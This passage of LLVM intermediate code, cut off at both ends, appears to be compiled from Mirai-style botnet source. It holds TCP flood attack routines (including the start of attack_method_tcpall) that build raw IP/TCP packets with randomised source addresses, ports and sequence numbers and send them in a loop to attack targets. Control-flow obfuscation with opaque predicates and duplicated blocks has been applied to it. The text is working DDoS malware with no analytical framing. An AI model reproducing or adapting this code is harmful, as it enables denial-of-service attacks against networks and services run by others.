  %165 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %166 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %165, i32 0, i32 3
  store i16 %164, i16* %166, align 4
  %167 = load i8, i8* %14, align 1
  %168 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %169 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %168, i32 0, i32 5
  store i8 %167, i8* %169, align 4
  %170 = load i8, i8* %15, align 1
  %171 = icmp ne i8 %170, 0
  br i1 %171, label %172, label %192

; <label>:172:                                    ; preds = %129
  %173 = load i32, i32* @x.45
  %174 = load i32, i32* @y.46
  %175 = sub i32 %173, 1
  %176 = mul i32 %173, %175
  %177 = urem i32 %176, 2
  %178 = icmp eq i32 %177, 0
  %179 = icmp slt i32 %174, 10
  %180 = or i1 %178, %179
  br i1 %180, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %172
  %181 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %182 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %183 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %182, i32 0, i32 4
  store i16 %181, i16* %183, align 2
  %184 = load i32, i32* @x.45
  %185 = load i32, i32* @y.46
  %186 = sub i32 %184, 1
  %187 = mul i32 %184, %186
  %188 = urem i32 %187, 2
  %189 = icmp eq i32 %188, 0
  %190 = icmp slt i32 %185, 10
  %191 = or i1 %189, %190
  br i1 %191, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %192

; <label>:192:                                    ; preds = %originalBBpart24, %129
  %193 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %194 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %193, i32 0, i32 6
  store i8 6, i8* %194, align 1
  %195 = load i32, i32* %26, align 4
  %196 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %197 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %196, i32 0, i32 8
  store i32 %195, i32* %197, align 4
  %198 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %199 = load i32, i32* %9, align 4
  %200 = sext i32 %199 to i64
  %201 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %198, i64 %200
  %202 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %201, i32 0, i32 1
  %203 = load i32, i32* %202, align 4
  %204 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %205 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %204, i32 0, i32 9
  store i32 %203, i32* %205, align 4
  %206 = load i16, i16* %16, align 2
  %207 = call zeroext i16 @htons(i16 zeroext %206) #7
  %208 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %209 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %208, i32 0, i32 0
  store i16 %207, i16* %209, align 4
  %210 = load i16, i16* %17, align 2
  %211 = call zeroext i16 @htons(i16 zeroext %210) #7
  %212 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %213 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %212, i32 0, i32 1
  store i16 %211, i16* %213, align 2
  %214 = load i32, i32* %18, align 4
  %215 = trunc i32 %214 to i16
  %216 = call zeroext i16 @htons(i16 zeroext %215) #7
  %217 = zext i16 %216 to i32
  %218 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %219 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %218, i32 0, i32 2
  store i32 %217, i32* %219, align 4
  %220 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %221 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %220, i32 0, i32 4
  %222 = load i16, i16* %221, align 4
  %223 = and i16 %222, -241
  %224 = or i16 %223, 160
  store i16 %224, i16* %221, align 4
  %225 = load i8, i8* %20, align 1
  %226 = sext i8 %225 to i16
  %227 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %228 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %227, i32 0, i32 4
  %229 = load i16, i16* %228, align 4
  %230 = and i16 %226, 1
  %231 = shl i16 %230, 13
  %232 = and i16 %229, -8193
  %233 = or i16 %232, %231
  store i16 %233, i16* %228, align 4
  %234 = load i8, i8* %21, align 1
  %235 = sext i8 %234 to i16
  %236 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %237 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %236, i32 0, i32 4
  %238 = load i16, i16* %237, align 4
  %239 = and i16 %235, 1
  %240 = shl i16 %239, 12
  %241 = and i16 %238, -4097
  %242 = or i16 %241, %240
  store i16 %242, i16* %237, align 4
  %243 = load i8, i8* %22, align 1
  %244 = sext i8 %243 to i16
  %245 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %246 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %245, i32 0, i32 4
  %247 = load i16, i16* %246, align 4
  %248 = and i16 %244, 1
  %249 = shl i16 %248, 11
  %250 = and i16 %247, -2049
  %251 = or i16 %250, %249
  store i16 %251, i16* %246, align 4
  %252 = load i8, i8* %23, align 1
  %253 = sext i8 %252 to i16
  %254 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %255 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %254, i32 0, i32 4
  %256 = load i16, i16* %255, align 4
  %257 = and i16 %253, 1
  %258 = shl i16 %257, 10
  %259 = and i16 %256, -1025
  %260 = or i16 %259, %258
  store i16 %260, i16* %255, align 4
  %261 = load i8, i8* %24, align 1
  %262 = sext i8 %261 to i16
  %263 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %264 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %263, i32 0, i32 4
  %265 = load i16, i16* %264, align 4
  %266 = and i16 %262, 1
  %267 = shl i16 %266, 9
  %268 = and i16 %265, -513
  %269 = or i16 %268, %267
  store i16 %269, i16* %264, align 4
  %270 = load i8, i8* %25, align 1
  %271 = sext i8 %270 to i16
  %272 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %273 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %272, i32 0, i32 4
  %274 = load i16, i16* %273, align 4
  %275 = and i16 %271, 1
  %276 = shl i16 %275, 8
  %277 = and i16 %274, -257
  %278 = or i16 %277, %276
  store i16 %278, i16* %273, align 4
  %279 = load i8*, i8** %29, align 8
  %280 = getelementptr inbounds i8, i8* %279, i32 1
  store i8* %280, i8** %29, align 8
  store i8 2, i8* %279, align 1
  %281 = load i8*, i8** %29, align 8
  %282 = getelementptr inbounds i8, i8* %281, i32 1
  store i8* %282, i8** %29, align 8
  store i8 4, i8* %281, align 1
  %283 = call i32 @rand_next()
  %284 = and i32 %283, 15
  %285 = add i32 1400, %284
  %286 = trunc i32 %285 to i16
  %287 = call zeroext i16 @htons(i16 zeroext %286) #7
  %288 = load i8*, i8** %29, align 8
  %289 = bitcast i8* %288 to i16*
  store i16 %287, i16* %289, align 2
  %290 = load i8*, i8** %29, align 8
  %291 = getelementptr inbounds i8, i8* %290, i64 2
  store i8* %291, i8** %29, align 8
  %292 = load i8*, i8** %29, align 8
  %293 = getelementptr inbounds i8, i8* %292, i32 1
  store i8* %293, i8** %29, align 8
  store i8 4, i8* %292, align 1
  %294 = load i8*, i8** %29, align 8
  %295 = getelementptr inbounds i8, i8* %294, i32 1
  store i8* %295, i8** %29, align 8
  store i8 2, i8* %294, align 1
  %296 = load i8*, i8** %29, align 8
  %297 = getelementptr inbounds i8, i8* %296, i32 1
  store i8* %297, i8** %29, align 8
  store i8 8, i8* %296, align 1
  %298 = load i8*, i8** %29, align 8
  %299 = getelementptr inbounds i8, i8* %298, i32 1
  store i8* %299, i8** %29, align 8
  store i8 10, i8* %298, align 1
  %300 = call i32 @rand_next()
  %301 = load i8*, i8** %29, align 8
  %302 = bitcast i8* %301 to i32*
  store i32 %300, i32* %302, align 4
  %303 = load i8*, i8** %29, align 8
  %304 = getelementptr inbounds i8, i8* %303, i64 4
  store i8* %304, i8** %29, align 8
  %305 = load i8*, i8** %29, align 8
  %306 = bitcast i8* %305 to i32*
  store i32 0, i32* %306, align 4
  %307 = load i8*, i8** %29, align 8
  %308 = getelementptr inbounds i8, i8* %307, i64 4
  store i8* %308, i8** %29, align 8
  %309 = load i8*, i8** %29, align 8
  %310 = getelementptr inbounds i8, i8* %309, i32 1
  store i8* %310, i8** %29, align 8
  store i8 1, i8* %309, align 1
  %311 = load i8*, i8** %29, align 8
  %312 = getelementptr inbounds i8, i8* %311, i32 1
  store i8* %312, i8** %29, align 8
  store i8 3, i8* %311, align 1
  %313 = load i8*, i8** %29, align 8
  %314 = getelementptr inbounds i8, i8* %313, i32 1
  store i8* %314, i8** %29, align 8
  store i8 3, i8* %313, align 1
  %315 = load i8*, i8** %29, align 8
  %316 = getelementptr inbounds i8, i8* %315, i32 1
  store i8* %316, i8** %29, align 8
  store i8 6, i8* %315, align 1
  br label %317

; <label>:317:                                    ; preds = %192
  %318 = load i32, i32* %9, align 4
  %319 = add nsw i32 %318, 1
  store i32 %319, i32* %9, align 4
  br label %124

; <label>:320:                                    ; preds = %124
  br label %321

; <label>:321:                                    ; preds = %originalBBpart239, %320
  %322 = load i32, i32* @x.45
  %323 = load i32, i32* @y.46
  %324 = sub i32 %322, 1
  %325 = mul i32 %322, %324
  %326 = urem i32 %325, 2
  %327 = icmp eq i32 %326, 0
  %328 = icmp slt i32 %323, 10
  %329 = or i1 %327, %328
  br i1 %329, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %321
  store i32 0, i32* %9, align 4
  %330 = load i32, i32* @x.45
  %331 = load i32, i32* @y.46
  %332 = sub i32 %330, 1
  %333 = mul i32 %330, %332
  %334 = urem i32 %333, 2
  %335 = icmp eq i32 %334, 0
  %336 = icmp slt i32 %331, 10
  %337 = or i1 %335, %336
  br i1 %337, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br label %338

; <label>:338:                                    ; preds = %561, %originalBBpart28
  %339 = load i32, i32* %9, align 4
  %340 = load i8, i8* %5, align 1
  %341 = zext i8 %340 to i32
  %342 = icmp slt i32 %339, %341
  br i1 %342, label %343, label %564

; <label>:343:                                    ; preds = %338
  %344 = load i8**, i8*** %11, align 8
  %345 = load i32, i32* %9, align 4
  %346 = sext i32 %345 to i64
  %347 = getelementptr inbounds i8*, i8** %344, i64 %346
  %348 = load i8*, i8** %347, align 8
  store i8* %348, i8** %30, align 8
  %349 = load i8*, i8** %30, align 8
  %350 = bitcast i8* %349 to %struct.iphdr*
  store %struct.iphdr* %350, %struct.iphdr** %31, align 8
  %351 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %352 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %351, i64 1
  %353 = bitcast %struct.iphdr* %352 to %struct.tcphdr*
  store %struct.tcphdr* %353, %struct.tcphdr** %32, align 8
  %354 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %355 = load i32, i32* %9, align 4
  %356 = sext i32 %355 to i64
  %357 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %354, i64 %356
  %358 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %357, i32 0, i32 2
  %359 = load i8, i8* %358, align 4
  %360 = zext i8 %359 to i32
  %361 = icmp slt i32 %360, 32
  br i1 %361, label %362, label %383

; <label>:362:                                    ; preds = %343
  %363 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %364 = load i32, i32* %9, align 4
  %365 = sext i32 %364 to i64
  %366 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %363, i64 %365
  %367 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %366, i32 0, i32 1
  %368 = load i32, i32* %367, align 4
  %369 = call i32 @ntohl(i32 %368) #7
  %370 = call i32 @rand_next()
  %371 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %372 = load i32, i32* %9, align 4
  %373 = sext i32 %372 to i64
  %374 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %371, i64 %373
  %375 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %374, i32 0, i32 2
  %376 = load i8, i8* %375, align 4
  %377 = zext i8 %376 to i32
  %378 = lshr i32 %370, %377
  %379 = add i32 %369, %378
  %380 = call i32 @htonl(i32 %379) #7
  %381 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %382 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %381, i32 0, i32 9
  store i32 %380, i32* %382, align 4
  br label %383

; <label>:383:                                    ; preds = %362, %343
  %384 = load i32, i32* @x.45
  %385 = load i32, i32* @y.46
  %386 = sub i32 %384, 1
  %387 = mul i32 %384, %386
  %388 = urem i32 %387, 2
  %389 = icmp eq i32 %388, 0
  %390 = icmp slt i32 %385, 10
  %391 = or i1 %389, %390
  br i1 %391, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %383
  %392 = load i32, i32* %26, align 4
  %393 = icmp eq i32 %392, -1
  %394 = load i32, i32* @x.45
  %395 = load i32, i32* @y.46
  %396 = sub i32 %394, 1
  %397 = mul i32 %394, %396
  %398 = urem i32 %397, 2
  %399 = icmp eq i32 %398, 0
  %400 = icmp slt i32 %395, 10
  %401 = or i1 %399, %400
  br i1 %401, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br i1 %393, label %402, label %422

; <label>:402:                                    ; preds = %originalBBpart212
  %403 = load i32, i32* @x.45
  %404 = load i32, i32* @y.46
  %405 = sub i32 %403, 1
  %406 = mul i32 %403, %405
  %407 = urem i32 %406, 2
  %408 = icmp eq i32 %407, 0
  %409 = icmp slt i32 %404, 10
  %410 = or i1 %408, %409
  br i1 %410, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %402
  %411 = call i32 @rand_next()
  %412 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %413 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %412, i32 0, i32 8
  store i32 %411, i32* %413, align 4
  %414 = load i32, i32* @x.45
  %415 = load i32, i32* @y.46
  %416 = sub i32 %414, 1
  %417 = mul i32 %414, %416
  %418 = urem i32 %417, 2
  %419 = icmp eq i32 %418, 0
  %420 = icmp slt i32 %415, 10
  %421 = or i1 %419, %420
  br i1 %421, label %originalBBpart216, label %originalBB14alteredBB

originalBBpart216:                                ; preds = %originalBB14
  br label %422

; <label>:422:                                    ; preds = %originalBBpart216, %originalBBpart212
  %423 = load i16, i16* %13, align 2
  %424 = zext i16 %423 to i32
  %425 = icmp eq i32 %424, 65535
  br i1 %425, label %426, label %432

; <label>:426:                                    ; preds = %422
  %427 = call i32 @rand_next()
  %428 = and i32 %427, 65535
  %429 = trunc i32 %428 to i16
  %430 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %431 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %430, i32 0, i32 3
  store i16 %429, i16* %431, align 4
  br label %432

; <label>:432:                                    ; preds = %426, %422
  %433 = load i16, i16* %16, align 2
  %434 = zext i16 %433 to i32
  %435 = icmp eq i32 %434, 65535
  br i1 %435, label %436, label %458

; <label>:436:                                    ; preds = %432
  %437 = load i32, i32* @x.45
  %438 = load i32, i32* @y.46
  %439 = sub i32 %437, 1
  %440 = mul i32 %437, %439
  %441 = urem i32 %440, 2
  %442 = icmp eq i32 %441, 0
  %443 = icmp slt i32 %438, 10
  %444 = or i1 %442, %443
  br i1 %444, label %originalBB18, label %originalBB18alteredBB

originalBB18:                                     ; preds = %originalBB18alteredBB, %436
  %445 = call i32 @rand_next()
  %446 = and i32 %445, 65535
  %447 = trunc i32 %446 to i16
  %448 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %449 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %448, i32 0, i32 0
  store i16 %447, i16* %449, align 4
  %450 = load i32, i32* @x.45
  %451 = load i32, i32* @y.46
  %452 = sub i32 %450, 1
  %453 = mul i32 %450, %452
  %454 = urem i32 %453, 2
  %455 = icmp eq i32 %454, 0
  %456 = icmp slt i32 %451, 10
  %457 = or i1 %455, %456
  br i1 %457, label %originalBBpart227, label %originalBB18alteredBB

originalBBpart227:                                ; preds = %originalBB18
  br label %458

; <label>:458:                                    ; preds = %originalBBpart227, %432
  %459 = load i16, i16* %17, align 2
  %460 = zext i16 %459 to i32
  %461 = icmp eq i32 %460, 65535
  br i1 %461, label %462, label %468

; <label>:462:                                    ; preds = %458
  %463 = call i32 @rand_next()
  %464 = and i32 %463, 65535
  %465 = trunc i32 %464 to i16
  %466 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %467 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %466, i32 0, i32 1
  store i16 %465, i16* %467, align 2
  br label %468

; <label>:468:                                    ; preds = %462, %458
  %469 = load i32, i32* %18, align 4
  %470 = icmp eq i32 %469, 65535
  br i1 %470, label %471, label %475

; <label>:471:                                    ; preds = %468
  %472 = call i32 @rand_next()
  %473 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %474 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %473, i32 0, i32 2
  store i32 %472, i32* %474, align 4
  br label %475

; <label>:475:                                    ; preds = %471, %468
  %476 = load i32, i32* @x.45
  %477 = load i32, i32* @y.46
  %478 = sub i32 %476, 1
  %479 = mul i32 %476, %478
  %480 = urem i32 %479, 2
  %481 = icmp eq i32 %480, 0
  %482 = icmp slt i32 %477, 10
  %483 = or i1 %481, %482
  br i1 %483, label %originalBB29, label %originalBB29alteredBB

originalBB29:                                     ; preds = %originalBB29alteredBB, %475
  %484 = load i32, i32* %19, align 4
  %485 = icmp eq i32 %484, 65535
  %486 = load i32, i32* @x.45
  %487 = load i32, i32* @y.46
  %488 = sub i32 %486, 1
  %489 = mul i32 %486, %488
  %490 = urem i32 %489, 2
  %491 = icmp eq i32 %490, 0
  %492 = icmp slt i32 %487, 10
  %493 = or i1 %491, %492
  br i1 %493, label %originalBBpart231, label %originalBB29alteredBB

originalBBpart231:                                ; preds = %originalBB29
  br i1 %485, label %494, label %498

; <label>:494:                                    ; preds = %originalBBpart231
  %495 = call i32 @rand_next()
  %496 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %497 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %496, i32 0, i32 3
  store i32 %495, i32* %497, align 4
  br label %498

; <label>:498:                                    ; preds = %494, %originalBBpart231
  %499 = load i32, i32* @x.45
  %500 = load i32, i32* @y.46
  %501 = sub i32 %499, 1
  %502 = mul i32 %499, %501
  %503 = urem i32 %502, 2
  %504 = icmp eq i32 %503, 0
  %505 = icmp slt i32 %500, 10
  %506 = or i1 %504, %505
  br i1 %506, label %originalBB33, label %originalBB33alteredBB

originalBB33:                                     ; preds = %originalBB33alteredBB, %498
  %507 = load i8, i8* %20, align 1
  %508 = icmp ne i8 %507, 0
  %509 = load i32, i32* @x.45
  %510 = load i32, i32* @y.46
  %511 = sub i32 %509, 1
  %512 = mul i32 %509, %511
  %513 = urem i32 %512, 2
  %514 = icmp eq i32 %513, 0
  %515 = icmp slt i32 %510, 10
  %516 = or i1 %514, %515
  br i1 %516, label %originalBBpart235, label %originalBB33alteredBB

originalBBpart235:                                ; preds = %originalBB33
  br i1 %508, label %517, label %523

; <label>:517:                                    ; preds = %originalBBpart235
  %518 = call i32 @rand_next()
  %519 = and i32 %518, 65535
  %520 = trunc i32 %519 to i16
  %521 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %522 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %521, i32 0, i32 7
  store i16 %520, i16* %522, align 2
  br label %523

; <label>:523:                                    ; preds = %517, %originalBBpart235
  %524 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %525 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %524, i32 0, i32 7
  store i16 0, i16* %525, align 2
  %526 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %527 = bitcast %struct.iphdr* %526 to i16*
  %528 = call zeroext i16 @checksum_generic(i16* %527, i32 20)
  %529 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %530 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %529, i32 0, i32 7
  store i16 %528, i16* %530, align 2
  %531 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %532 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %531, i32 0, i32 6
  store i16 0, i16* %532, align 4
  %533 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %534 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %535 = bitcast %struct.tcphdr* %534 to i8*
  %536 = call zeroext i16 @htons(i16 zeroext 40) #7
  %537 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %533, i8* %535, i16 zeroext %536, i32 40)
  %538 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %539 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %538, i32 0, i32 6
  store i16 %537, i16* %539, align 4
  %540 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %541 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %540, i32 0, i32 1
  %542 = load i16, i16* %541, align 2
  %543 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %544 = load i32, i32* %9, align 4
  %545 = sext i32 %544 to i64
  %546 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %543, i64 %545
  %547 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %546, i32 0, i32 0
  %548 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %547, i32 0, i32 1
  store i16 %542, i16* %548, align 2
  %549 = load i32, i32* %10, align 4
  %550 = load i8*, i8** %30, align 8
  %551 = bitcast %union.__CONST_SOCKADDR_ARG* %33 to %struct.sockaddr**
  %552 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %553 = load i32, i32* %9, align 4
  %554 = sext i32 %553 to i64
  %555 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %552, i64 %554
  %556 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %555, i32 0, i32 0
  %557 = bitcast %struct.sockaddr_in* %556 to %struct.sockaddr*
  store %struct.sockaddr* %557, %struct.sockaddr** %551, align 8
  %558 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %33, i32 0, i32 0
  %559 = load %struct.sockaddr*, %struct.sockaddr** %558, align 8
  %560 = call i64 @sendto(i32 %549, i8* %550, i64 60, i32 16384, %struct.sockaddr* %559, i32 16)
  br label %561

; <label>:561:                                    ; preds = %523
  %562 = load i32, i32* %9, align 4
  %563 = add nsw i32 %562, 1
  store i32 %563, i32* %9, align 4
  br label %338

; <label>:564:                                    ; preds = %338
  %565 = load i32, i32* @x.45
  %566 = load i32, i32* @y.46
  %567 = sub i32 %565, 1
  %568 = mul i32 %565, %567
  %569 = urem i32 %568, 2
  %570 = icmp eq i32 %569, 0
  %571 = icmp slt i32 %566, 10
  %572 = or i1 %570, %571
  br i1 %572, label %originalBB37, label %originalBB37alteredBB

originalBB37:                                     ; preds = %originalBB37alteredBB, %564
  %573 = load i32, i32* @x.45
  %574 = load i32, i32* @y.46
  %575 = sub i32 %573, 1
  %576 = mul i32 %573, %575
  %577 = urem i32 %576, 2
  %578 = icmp eq i32 %577, 0
  %579 = icmp slt i32 %574, 10
  %580 = or i1 %578, %579
  br i1 %580, label %originalBBpart239, label %originalBB37alteredBB

originalBBpart239:                                ; preds = %originalBB37
  br label %321

; <label>:581:                                    ; preds = %120, %98
  %582 = load i32, i32* @x.45
  %583 = load i32, i32* @y.46
  %584 = sub i32 %582, 1
  %585 = mul i32 %582, %584
  %586 = urem i32 %585, 2
  %587 = icmp eq i32 %586, 0
  %588 = icmp slt i32 %583, 10
  %589 = or i1 %587, %588
  br i1 %589, label %originalBB41, label %originalBB41alteredBB

originalBB41:                                     ; preds = %originalBB41alteredBB, %581
  %590 = load i32, i32* @x.45
  %591 = load i32, i32* @y.46
  %592 = sub i32 %590, 1
  %593 = mul i32 %590, %592
  %594 = urem i32 %593, 2
  %595 = icmp eq i32 %594, 0
  %596 = icmp slt i32 %591, 10
  %597 = or i1 %595, %596
  br i1 %597, label %originalBBpart243, label %originalBB41alteredBB

originalBBpart243:                                ; preds = %originalBB41
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %99
  store i32 1, i32* %9, align 4
  %598 = load i32, i32* %10, align 4
  %599 = bitcast i32* %9 to i8*
  %600 = call i32 @setsockopt(i32 %598, i32 0, i32 3, i8* %599, i32 4) #6
  %601 = icmp eq i32 %600, -1
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %172
  %602 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %603 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %604 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %603, i32 0, i32 4
  store i16 %602, i16* %604, align 2
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %321
  store i32 0, i32* %9, align 4
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %383
  %605 = load i32, i32* %26, align 4
  %606 = icmp eq i32 %605, -1
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %402
  %607 = call i32 @rand_next()
  %608 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %609 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %608, i32 0, i32 8
  store i32 %607, i32* %609, align 4
  br label %originalBB14

originalBB18alteredBB:                            ; preds = %originalBB18, %436
  %610 = call i32 @rand_next()
  %_ = sub i32 0, %610
  %gen = add i32 %_, 65535
  %_19 = sub i32 %610, 65535
  %gen20 = mul i32 %_19, 65535
  %_21 = shl i32 %610, 65535
  %_22 = shl i32 %610, 65535
  %_23 = sub i32 0, %610
  %gen24 = add i32 %_23, 65535
  %611 = and i32 %610, 65535
  %612 = trunc i32 %611 to i16
  %613 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %614 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %613, i32 0, i32 0
  store i16 %612, i16* %614, align 4
  br label %originalBB18

originalBB29alteredBB:                            ; preds = %originalBB29, %475
  %615 = load i32, i32* %19, align 4
  %616 = icmp eq i32 %615, 65535
  br label %originalBB29

originalBB33alteredBB:                            ; preds = %originalBB33, %498
  %617 = load i8, i8* %20, align 1
  %618 = icmp ne i8 %617, 0
  br label %originalBB33

originalBB37alteredBB:                            ; preds = %originalBB37, %564
  br label %originalBB37

originalBB41alteredBB:                            ; preds = %originalBB41, %581
  br label %originalBB41
}

; Function Attrs: noinline nounwind uwtable
define void @attack_method_tcpall(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %5 = alloca i8, align 1
  %6 = alloca %struct.attack_target*, align 8
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_option*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i8**, align 8
  %12 = alloca i8, align 1
  %13 = alloca i16, align 2
  %14 = alloca i8, align 1
  %15 = alloca i8, align 1
  %16 = alloca i16, align 2
  %17 = alloca i16, align 2
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i8, align 1
  %21 = alloca i8, align 1
  %22 = alloca i8, align 1
  %23 = alloca i8, align 1
  %24 = alloca i8, align 1
  %25 = alloca i8, align 1
  %26 = alloca i32, align 4
  %27 = alloca %struct.iphdr*, align 8
  %28 = alloca %struct.tcphdr*, align 8
  %29 = alloca i8*, align 8
  %30 = alloca i8*, align 8
  %31 = alloca %struct.iphdr*, align 8
  %32 = alloca %struct.tcphdr*, align 8
  %33 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i8 %0, i8* %5, align 1
  store %struct.attack_target* %1, %struct.attack_target** %6, align 8
  store i8 %2, i8* %7, align 1
  store %struct.attack_option* %3, %struct.attack_option** %8, align 8
  %34 = load i8, i8* %5, align 1
  %35 = zext i8 %34 to i64
  %36 = call noalias i8* @calloc(i64 %35, i64 8) #6
  %37 = bitcast i8* %36 to i8**
  store i8** %37, i8*** %11, align 8
  %38 = load i8, i8* %7, align 1
  %39 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %40 = call i32 @attack_get_opt_int(i8 zeroext %38, %struct.attack_option* %39, i8 zeroext 2, i32 0)
  %41 = trunc i32 %40 to i8
  store i8 %41, i8* %12, align 1
  %42 = load i8, i8* %7, align 1
  %43 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %44 = call i32 @attack_get_opt_int(i8 zeroext %42, %struct.attack_option* %43, i8 zeroext 3, i32 65535)
  %45 = trunc i32 %44 to i16
  store i16 %45, i16* %13, align 2
  %46 = load i8, i8* %7, align 1
  %47 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %48 = call i32 @attack_get_opt_int(i8 zeroext %46, %struct.attack_option* %47, i8 zeroext 4, i32 64)
  %49 = trunc i32 %48 to i8
  store i8 %49, i8* %14, align 1
  %50 = load i8, i8* %7, align 1
  %51 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %52 = call i32 @attack_get_opt_int(i8 zeroext %50, %struct.attack_option* %51, i8 zeroext 5, i32 1)
  %53 = trunc i32 %52 to i8
  store i8 %53, i8* %15, align 1
  %54 = load i8, i8* %7, align 1
  %55 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %56 = call i32 @attack_get_opt_int(i8 zeroext %54, %struct.attack_option* %55, i8 zeroext 6, i32 65535)
  %57 = trunc i32 %56 to i16
